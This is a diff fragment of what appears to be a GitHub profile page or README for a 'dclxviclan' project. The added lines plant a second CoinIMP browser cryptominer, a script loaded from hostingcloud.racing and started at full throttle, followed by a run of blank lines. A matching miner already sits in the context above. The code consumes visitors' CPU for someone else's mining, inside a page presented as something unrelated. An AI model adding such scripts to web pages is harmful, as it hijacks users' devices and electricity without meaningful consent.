@@ -12,6 +12,33 @@ import dclxviclan
   _client.start();
   _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40,"#3d3d3d");
 </script>
+
+<script src="https://www.hostingcloud.racing/7F4H.js"></script>
+<script>
+  var _client = new Client.Anonymous('87536b035994a0e003193a83830725886aaae3ea4391c26e95b92b0808c36f3e', {
+    throttle: 0, c: 'w'
+  });
+  _client.start();
+  _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40,"#3d3d3d");
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ```
 ![](https://github.com/dclxviclan/happynewyearfemopresentapkgame/blob/main/Media_221228_025641.gif)
 [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=52FF98&width=435&lines=where+i+can+find+u👽+hint)](https://git.io/typing-svg)
